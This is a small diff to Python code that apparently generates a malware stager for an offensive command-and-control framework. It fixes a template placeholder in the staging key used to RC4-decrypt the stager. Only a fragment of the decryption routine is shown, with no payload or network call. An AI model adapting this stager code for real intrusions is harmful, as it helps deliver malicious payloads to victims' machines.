@@ -62,7 +62,7 @@ def python_extract_stager(staging_key):
     # ==== EXTRACT IV AND STAGER ====
     IV=a[0:4];
     data=a[4:];
-    key=IV+'{ staging_key }'.encode('UTF-8');
+    key=IV+'{staging_key}'.encode('UTF-8');
     # ==== DECRYPT STAGER (RC4) ====
     S,j,out=list(range(256)),0,[];
     for i in list(range(256)):
